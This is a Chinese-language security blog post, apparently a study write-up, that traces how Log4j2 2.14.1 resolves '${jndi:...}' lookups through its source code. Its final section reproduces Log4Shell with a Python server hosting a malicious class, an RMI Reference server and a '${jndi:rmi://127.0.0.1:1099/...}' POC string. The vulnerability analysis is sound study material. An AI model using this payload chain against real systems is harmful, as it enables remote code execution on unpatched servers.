@@ -1,0 +1,563 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Log4j2反序列化 | Bloyet&#39;s blog</title>
+<link rel="shortcut icon" href="https://bloyet.github.io/favicon.ico?v=1752383988636">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://bloyet.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Log4j2反序列化 | Bloyet&#39;s blog - Atom Feed" href="https://bloyet.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="学习log4j2反序列化之前呢，需要先来学习一下它是什么东西，怎么用
+Log4j2
+log4j 和 log4j2 都是日志管理工具，相比于 log4j，log4j2 一步步变得越来越主流
+环境配置
+依赖：
+&lt;dependency&gt..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://bloyet.github.io">
+  <img class="avatar" src="https://bloyet.github.io/images/avatar.png?v=1752383988636" alt="">
+  </a>
+  <h1 class="site-title">
+    Bloyet&#39;s blog
+  </h1>
+  <p class="site-description">
+    做那个人的战士，和他一起去经历，失败!
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          Home
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/friends" class="menu">
+          Friends
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Log4j2反序列化
+            </h2>
+            <div class="post-info">
+              <span>
+                2025-06-11
+              </span>
+              <span>
+                15 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>学习log4j2反序列化之前呢，需要先来学习一下它是什么东西，怎么用</p>
+<h1 id="log4j2">Log4j2</h1>
+<p>log4j 和 log4j2 都是日志管理工具，相比于 log4j，log4j2 一步步变得越来越主流</p>
+<h2 id="环境配置">环境配置</h2>
+<p>依赖：</p>
+<pre><code class="language-java">&lt;dependency&gt;
+&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+&lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+&lt;version&gt;2.14.1&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+&lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
+&lt;version&gt;2.14.1&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+&lt;groupId&gt;junit&lt;/groupId&gt;
+&lt;artifactId&gt;junit&lt;/artifactId&gt;
+&lt;version&gt;4.12&lt;/version&gt;
+&lt;scope&gt;test&lt;/scope&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>我们这里用xlm来完成log4j的配置：</p>
+<p>通常分为两个部分：1.设置日志信息输出目的地 2.定义 logger，也就是定位我们需要打日志的包中</p>
+<p>把xml放在resources文件夹下，而且文件名必须是log4j2.xml（如果是用xml形式的话）</p>
+<pre><code class="language-java">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;Configuration status=&quot;TRACE&quot;&gt;
+
+&lt;!-- 配置日志信息输出目的地  Appenders--&gt;
+&lt;Appenders&gt;
+&lt;!-- 输出到控制台 --&gt;
+&lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;
+&lt;!--配置日志信息的格式 --&gt;
+&lt;PatternLayout
+pattern=&quot;%d{HH:mm:ss} [%t] %-5level %logger{36} - %msg%n&quot; /&gt;
+&quot;/&gt;
+&lt;/Console&gt;
+
+&lt;!-- 输出到文件，其中有一个append属性，默认为true，即不清空该文件原来的信息，采用添加的方式，若设为false，则会先清空原来的信息，再添加 --&gt;
+&lt;File name=&quot;MyFile&quot; fileName=&quot;./logs/info.log&quot; append=&quot;true&quot;&gt;
+&lt;PatternLayout&gt;
+&lt;!--配置日志信息的格式 --&gt;
+&lt;pattern&gt;%d{HH:mm:ss} [%t] %-5level %logger{36} - %msg%n&lt;/pattern&gt;
+            &lt;/PatternLayout&gt;
+            &lt;/File&gt;
+
+            &lt;/Appenders&gt;
+
+
+            &lt;!-- 定义logger,只有定义了logger并引入了appender,appender才会有效 --&gt;
+            &lt;Loggers&gt;
+            &lt;!-- 将业务dao接口所在的包填写进去,并用在控制台和文件中输出 --&gt; 记住你的文件是什么在xml就要对应
+            &lt;logger name=&quot;text&quot; level=&quot;TRACE&quot;
+            additivity=&quot;false&quot;&gt;
+            &lt;AppenderRef ref=&quot;Console&quot; /&gt;
+            &lt;AppenderRef ref=&quot;MyFile&quot; /&gt;
+            &lt;/logger&gt;
+
+            &lt;Root level=&quot;info&quot;&gt;
+            &lt;AppenderRef ref=&quot;Console&quot; /&gt;
+            &lt;AppenderRef ref=&quot;MyFile&quot; /&gt;
+            &lt;/Root&gt;
+            &lt;/Loggers&gt;
+            &lt;/Configuration&gt;
+</code></pre>
+<p>text类：</p>
+<pre><code class="language-java">package org.example;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class text {
+    public static void main(String[] args) {
+        Logger logger = LogManager.getLogger(text.class);
+        logger.trace(&quot;trace level&quot;);
+        logger.debug(&quot;debug level&quot;);
+        logger.info(&quot;info level&quot;);
+        logger.warn(&quot;warn level&quot;);
+        logger.error(&quot;error level&quot;);
+        logger.fatal(&quot;fatal level&quot;);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1749609817674.png" alt="" loading="lazy"></figure>
+<p>会发现自动生成了个logs文件夹，也是我们在xml文件中配置好的</p>
+<h1 id="log4j2-功能组件分析">log4j2 功能组件分析</h1>
+<h2 id="日志记录">日志记录</h2>
+<p>我们是使用**LogManager.getLogger()**方法来获取一个 logger 对象，然后通过调用 logger 对象的 debug/info/error/warn/fatal/trace/log 等方法记录日志等信息，随便打个断点就知道了，都会先使用org.apache.logging.log4j.spi.AbstractLogger#logIfEnabled的若干重载方法</p>
+<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1749609817685.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1749609817696.png" alt="" loading="lazy"></figure>
+<p>根据当前配置文件中的配置信息中记录的日志等级，来判断是否需要输出 console 以及日志记录文件，log4j 中的日志记录等级默认如下： ALL &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL &lt; OFF ，然后默认输出的是 WARN/ERROR/FATAL 等级的日志信息,当然我们也可以进行修改，在配置文件中去修改记录等级</p>
+<p>我们可以看到Logger本身就是一个接口，等看到下文，就知道只要调用了 info，error，warn 等方法都可以被作为漏洞的触发点。不同点是配置的输出等级不同</p>
+<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1749609817707.png" alt="" loading="lazy"></figure>
+<h2 id="消息格式化">消息格式化</h2>
+<p>log4j2 采用<strong>org.apache.logging.log4j.core.pattern.MessagePatternConverter</strong>来对日志信息进行处理</p>
+<p>大致看看这个目录结构：</p>
+<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1749609817718.png" alt="" loading="lazy"></figure>
+<p>先看看构造方法： 怎么进行初始化的</p>
+<p>会从 Properties 及 Options 中获取配置来判断是否需要提供 Lookups 功能</p>
+<pre><code class="language-java">private MessagePatternConverter(final Configuration config, final String[] options) {
+    super(&quot;Message&quot;, &quot;message&quot;);
+    this.formats = options;
+    this.config = config;
+    final int noLookupsIdx = loadNoLookups(options);
+    // 从系统配置（Properties）和 options 共同判断是否禁用 lookup
+    this.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= 0;
+    // 加载文本渲染器（根据是否禁用 lookup 决定传什么参数）
+    this.textRenderer = loadMessageRenderer(noLookupsIdx &gt;= 0 ? ArrayUtils.remove(options, noLookupsIdx) : options);
+}
+</code></pre>
+<p>并且其中<code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</code>的获取是通过工具类的 <code>getBooleanProperty</code>方法来获取的</p>
+<pre><code class="language-java">public static final boolean FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty(
+    &quot;log4j2.formatMsgNoLookups&quot;, false);
+</code></pre>
+<p>getBooleanProperty：</p>
+<pre><code class="language-java">public boolean getBooleanProperty(final String name, final boolean defaultValue) {
+    String prop = this.getStringProperty(name);
+    return prop == null ? defaultValue : &quot;true&quot;.equalsIgnoreCase(prop);
+}
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1749609817731.png" alt="" loading="lazy"></figure>
+<p>在getBooleanProperty默认会传进来一个false，然后进行一个三目运算，就把defaultValue，也就是false</p>
+<p>在来看看noLookupsIdx的值：</p>
+<p>在默认情况下，options是个空数组，运算出来为-1</p>
+<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1749609817742.png" alt="" loading="lazy"></figure>
+<p>结合这两个，就可以看到：</p>
+<pre><code class="language-java">//默认情况下，noLookups是false，也就是不禁用Lookup的
+this.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= 0;
+</code></pre>
+<p>然后就继续执行loadMessageRenderer方法，根据是否禁用 lookup 决定传什么参数，所以传的是options的值：</p>
+<p>options只是空字符串数组，并不等于null，方法通过 options 中的字符配置来获取相应的模板渲染器</p>
+<pre><code class="language-java">private TextRenderer loadMessageRenderer(final String[] options) {
+    if (options != null) {
+        for (final String option : options) {
+            switch (option.toUpperCase(Locale.ROOT)) {
+                case &quot;ANSI&quot;:
+                    if (Loader.isJansiAvailable()) {
+                        return new JAnsiTextRenderer(options, JAnsiTextRenderer.DefaultMessageStyleMap);
+                    }
+                    StatusLogger.getLogger()
+                    .warn(&quot;You requested ANSI message rendering but JANSI is not on the classpath.&quot;);
+                    return null;
+                case &quot;HTML&quot;:
+                    return new HtmlTextRenderer(options);
+            }
+        }
+    }
+    return null;
+}
+</code></pre>
+<p>看到format方法，也是在<strong>MessagePatternConverter</strong>这个类中</p>
+<p>第一段 if 判断的内容是先从 event 中获取到 message，然后判断 message 的类型是否为 StringBuilderFormattable，之后就是渲染的具体内容<br>
+第二段 if 判断的内容是重点，在一个正常请求的情况下：config 获取不为空，并且 noLookups 默认为 false 的情况下，标志着我们可以通过 lookups 功能来进行<strong>字符串解析</strong><br>
+然后这里的解析功能的重点是在 <code>config.getStrSubstitutor().replace(event, value)</code>中</p>
+<pre><code class="language-java">public void format(final LogEvent event, final StringBuilder toAppendTo) {
+    final Message msg = event.getMessage();
+    if (msg instanceof StringBuilderFormattable) {
+
+        final boolean doRender = textRenderer != null;
+        final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo;
+
+        final int offset = workingBuilder.length();
+        if (msg instanceof MultiFormatStringBuilderFormattable) {
+            ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder);
+        } else {
+            ((StringBuilderFormattable) msg).formatTo(workingBuilder);
+        }
+
+        // TODO can we optimize this?
+        if (config != null &amp;&amp; !noLookups) {
+            for (int i = offset; i &lt; workingBuilder.length() - 1; i++) {
+                if (workingBuilder.charAt(i) == '$' &amp;&amp; workingBuilder.charAt(i + 1) == '{') {
+                    final String value = workingBuilder.substring(offset, workingBuilder.length());
+                    workingBuilder.setLength(offset);
+                    workingBuilder.append(config.getStrSubstitutor().replace(event, value));
+                }
+            }
+        }
+        if (doRender) {
+            textRenderer.render(workingBuilder, toAppendTo);
+        }
+        return;
+    }
+    if (msg != null) {
+        String result;
+        if (msg instanceof MultiformatMessage) {
+            result = ((MultiformatMessage) msg).getFormattedMessage(formats);
+        } else {
+            result = msg.getFormattedMessage();
+        }
+        if (result != null) {
+            toAppendTo.append(config != null &amp;&amp; result.contains(&quot;${&quot;)
+                              ? config.getStrSubstitutor().replace(event, result) : result);
+        } else {
+            toAppendTo.append(&quot;null&quot;);
+        }
+    }
+}
+</code></pre>
+<h2 id="字符处理">字符处理</h2>
+<p>处理字符串的关键类是StrSubstitutor</p>
+<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1749609817753.png" alt="" loading="lazy"></figure>
+<p>先看下这个类定义的常量：</p>
+<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1749609817763.png" alt="" loading="lazy"></figure>
+<pre><code>DEFAULT_ESCAPE` 是 `$`，`DEFAULT_PREFIX` 前缀是 `${`，`DEFAULT_SUFFIX` 后缀是 `}`，`DEFAULT_VALUE_DELIMITER_STRING` 赋值分隔符是 `:-`，`ESCAPE_DELIMITER_STRING` 是 `:\-
+</code></pre>
+<p>substitute是StrSubstitutor 中的关键方法，也是lookup中的关键点，用来递归处理字符串</p>
+<p>方法比较多，我们就看关键步骤，知道怎么对字符串进行处理的就行：<br>
+方法的开头先把各个前后缀以及内容的匹配器加载上</p>
+<p><img src="https://bloyet.github.io/post-images/1749612710807.png" alt="" loading="lazy"><br>
+然后通过 while 循环来找前缀，这里找的前缀是最开始的前缀</p>
+<p><img src="https://bloyet.github.io/post-images/1749612812025.png" alt="" loading="lazy"><br>
+找完前缀再找后缀，不过在找后缀的 while 循环中，又判断了是否替换变量中的值，如果替换，则再匹配一次前缀，如果找到了前缀，则 continue 跳出循环，再走一次找后缀的逻辑，比如说这个<span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;}&#039;, got &#039;EOF&#039; at end of input: {'>{</span>{}}这种情况<br>
+<img src="https://bloyet.github.io/post-images/1749612812036.png" alt="" loading="lazy"><br>
+后续的逻辑中，主要是针对<code>DEFAULT_VALUE_DELIMITER_STRING</code>以及<code>ESCAPE_DELIMITER_STRING</code>进行，通过多个 if/else 来匹配<code>:-</code>和<code>:\-</code></p>
+<p><img src="https://bloyet.github.io/post-images/1749612812046.png" alt="" loading="lazy"><br>
+这里就不一一分析代码了，这里其实就是对两个标识符的功能的描述：</p>
+<ul>
+<li><code>:- </code>是一个赋值关键字，如果程序处理到 <code>${aaaa:-bbbb}</code> 这样的字符串，处理的结果将会是 <code>bbbb</code>，<code>:-</code> 关键字将会被截取掉，而之前的字符串都会被舍弃掉。</li>
+<li><code>:\-</code> 是转义的 <code>:-</code>，如果一个用 <code>a:b</code> 表示的键值对的 key a 中包含<code>:</code>，则需要使用转义来配合处理，例如 <code>${aaa:\\-bbb:-ccc}</code>，代表 key 是<code>aaa:bbb</code>，value 是 <code>ccc</code></li>
+</ul>
+<p>在没有匹配到变量赋值或者匹配结束后，将会调用<code>resolveVariable</code>方法：</p>
+<p>他会先获得一个VariableResolver类，实际上它是个代理类，调用这个代理类的lookup方法，我们现在在来深入研究这个代理类</p>
+<pre><code class="language-java">protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,
+                                 final int startPos, final int endPos) {
+    final StrLookup resolver = getVariableResolver();
+    if (resolver == null) {
+        return null;
+    }
+    return resolver.lookup(event, variableName);
+}
+</code></pre>
+<h2 id="代理类分析">代理类分析</h2>
+<p>Log4j2 使用 <code>org.apache.logging.log4j.core.lookup.Interpolator</code> 类来代理所有的 <code>StrLookup</code> 实现类。也就是说在实际使用 Lookup 功能时，由 Interpolator 这个类来处理和分发</p>
+<p>先看一眼目录结构</p>
+<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1749609817773.png" alt="" loading="lazy"></figure>
+<p>先看一下构造方法：</p>
+<p>这个类在初始化时创建了一个 <code>strLookupMap</code> ，将一些 lookup 功能关键字和处理类进行了映射，存放在这个 Map 中</p>
+<p>在 2.14.0 版本中，默认是加入 log4j、sys、env、main、marker、java、lower、upper、<strong>jndi</strong>、jvmrunargs、spring、kubernetes、docker、web、date、ctx，由于部分功能的支持并不在 core 包中，所以如果加载不到对应的处理类，则会添加警告信息并跳过。而这些不同 Lookup 功能的支持，是随着版本更新的，例如在较低版本中，不存在 upper、lower 这两种功能，因此在使用时要注意环境。</p>
+<figure data-type="image" tabindex="11"><img src="https://bloyet.github.io/post-images/1749609817784.png" alt="" loading="lazy"></figure>
+<p>我们直接去看lookup方法：</p>
+<figure data-type="image" tabindex="12"><img src="https://bloyet.github.io/post-images/1749609817795.png" alt="" loading="lazy"></figure>
+<p>它通过<code>:</code>作为表示符，用来分隔 Lookup 关键字和参数，从 strLookup 中根据分割出来的关键字匹配到相应的处理类，并调用其 Lookup 方法</p>
+<p>漏洞触发点：jndi:      因为在这里它是有着对应的处理类的，并且这个处理类可以进行利用</p>
+<p><code>jndi:</code>关键字对应的处理类是<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>，我们跟进查看具体它的 lookup 方法是如何被调用的</p>
+<pre><code class="language-java">public String lookup(final LogEvent event, String var) {
+    if (var == null) {
+        return null;
+    }
+
+    final int prefixPos = var.indexOf(PREFIX_SEPARATOR);
+    if (prefixPos &gt;= 0) {
+        final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US);
+        final String name = var.substring(prefixPos + 1);
+        final StrLookup lookup = strLookupMap.get(prefix);
+        if (lookup instanceof ConfigurationAware) {
+            ((ConfigurationAware) lookup).setConfiguration(configuration);
+        }
+        String value = null;
+        if (lookup != null) {
+            value = event == null ? lookup.lookup(name) : lookup.lookup(event, name);
+        }
+
+        if (value != null) {
+            return value;
+        }
+        var = var.substring(prefixPos + 1);
+    }
+    if (defaultLookup != null) {
+        return event == null ? defaultLookup.lookup(var) : defaultLookup.lookup(event, var);
+    }
+    return null;
+}
+</code></pre>
+<p>看具体的处理类：JndiLookup#lookup</p>
+<pre><code class="language-java">public String lookup(final LogEvent event, final String key) {
+    if (key == null) {
+        return null;
+    }
+    final String jndiName = convertJndiName(key);
+    try (final JndiManager jndiManager = JndiManager.getDefaultManager()) {
+        return Objects.toString(jndiManager.lookup(jndiName), null);
+    } catch (final NamingException e) {
+        LOGGER.warn(LOOKUP, &quot;Error looking up JNDI resource [{}].&quot;, jndiName, e);
+        return null;
+    }
+}
+</code></pre>
+<p>JndiManager 的 lookup</p>
+<pre><code class="language-java">public &lt;T&gt; T lookup(final String name) throws NamingException {
+    return (T) this.context.lookup(name);
+}
+</code></pre>
+<p>看下这个context是不是满足JNDI的context ，context是什么</p>
+<figure data-type="image" tabindex="13"><img src="https://bloyet.github.io/post-images/1749609817805.png" alt="" loading="lazy"></figure>
+<p>在构造方法中进行了赋值，看看哪里调用了构造方法（唯一）：</p>
+<pre><code class="language-java">private static class JndiManagerFactory implements ManagerFactory&lt;JndiManager, Properties&gt; {
+
+    @Override
+    public JndiManager createManager(final String name, final Properties data) {
+        try {
+            return new JndiManager(name, new InitialContext(data));
+        } catch (final NamingException e) {
+            LOGGER.error(&quot;Error creating JNDI InitialContext.&quot;, e);
+            return null;
+        }
+    }
+}
+</code></pre>
+<p>从正面看：</p>
+<p>final JndiManager jndiManager = JndiManager.getDefaultManager()  -&gt;getManager -&gt;manager = factory.createManager(name, data); 然后就是上面这段实例化了</p>
+<p>所以这个上下文就是InitialContext了，那么调用的就是InitialContext 的 lookup ，之后就是熟悉的 JNDI 注入的原始的流程了</p>
+<h1 id="漏洞复现">漏洞复现</h1>
+<p>启个python服务 里面是我们的恶意工厂类字节码：</p>
+<p>python -m http.server 8000</p>
+<p>启个rmi服务器：</p>
+<pre><code class="language-java">package org.example;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.Reference;
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+
+public class JNDI_server {
+    public static void main(String[] args) throws Exception {
+        LocateRegistry.createRegistry(1099);
+        Reference reference=new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://127.0.0.1:8000/&quot;);
+        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
+        Naming.bind(&quot;rmi://127.0.0.1:1099/Bloyet&quot;,referenceWrapper);
+    }
+}
+</code></pre>
+<p>POC:</p>
+<pre><code class="language-java">package org.example;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class log4j2POC {
+    public static void main(String[] args) {
+        Logger logger = LogManager.getLogger(log4j2POC.class);
+
+        String poc = &quot;${jndi:rmi://127.0.0.1:1099/Bloyet}&quot;;
+
+        logger.info(&quot;EXP {} EXP&quot;,poc);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://bloyet.github.io/post-images/1749609817816.png" alt="" loading="lazy"></figure>
+<p>在来跟着看一遍流程，其实一开始已经走过一遍了，这一遍理解起来会简单很多。因为这个是会设计日志操作，跟我们漏洞无关的我们就不跟了。</p>
+<p>我们知道漏洞点是字符串处理阶段，我们直接来看最关键的类和方法就行了</p>
+<figure data-type="image" tabindex="15"><img src="https://bloyet.github.io/post-images/1749609817827.png" alt="" loading="lazy"></figure>
+<p>走到代理类：</p>
+<figure data-type="image" tabindex="16"><img src="https://bloyet.github.io/post-images/1749609817837.png" alt="" loading="lazy"></figure>
+<p>调用代理类的lookup方法：</p>
+<figure data-type="image" tabindex="17"><img src="https://bloyet.github.io/post-images/1749609817848.png" alt="" loading="lazy"></figure>
+<p>发现确实是Interpolator真正处理lookup方法的类</p>
+<figure data-type="image" tabindex="18"><img src="https://bloyet.github.io/post-images/1749609817859.png" alt="" loading="lazy"></figure>
+<p>走到处理jndi功能点的类：JndiManager</p>
+<figure data-type="image" tabindex="19"><img src="https://bloyet.github.io/post-images/1749609817869.png" alt="" loading="lazy"></figure>
+<p>步入getDefaultManager方法</p>
+<p>在这里进行实例化，并且初始化context上下文</p>
+<figure data-type="image" tabindex="20"><img src="https://bloyet.github.io/post-images/1749609817880.png" alt="" loading="lazy"></figure>
+<p>继续</p>
+<figure data-type="image" tabindex="21"><img src="https://bloyet.github.io/post-images/1749609817890.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="22"><img src="https://bloyet.github.io/post-images/1749609817901.png" alt="" loading="lazy"></figure>
+<p>实例化一个新的JndiManager 并且实例化一个上下文</p>
+<figure data-type="image" tabindex="23"><img src="https://bloyet.github.io/post-images/1749609817911.png" alt="" loading="lazy"></figure>
+<p>一路跟进到最终的lookup方法，到这 就可以看到 游戏结束！</p>
+<figure data-type="image" tabindex="24"><img src="https://bloyet.github.io/post-images/1749609817921.png" alt="" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#log4j2">Log4j2</a>
+<ul>
+<li><a href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">环境配置</a></li>
+</ul>
+</li>
+<li><a href="#log4j2-%E5%8A%9F%E8%83%BD%E7%BB%84%E4%BB%B6%E5%88%86%E6%9E%90">log4j2 功能组件分析</a>
+<ul>
+<li><a href="#%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">日志记录</a></li>
+<li><a href="#%E6%B6%88%E6%81%AF%E6%A0%BC%E5%BC%8F%E5%8C%96">消息格式化</a></li>
+<li><a href="#%E5%AD%97%E7%AC%A6%E5%A4%84%E7%90%86">字符处理</a></li>
+<li><a href="#%E4%BB%A3%E7%90%86%E7%B1%BB%E5%88%86%E6%9E%90">代理类分析</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://bloyet.github.io/post/fastjson/">
+              <h3 class="post-title">
+                Fastjson反序列化
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://bloyet.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
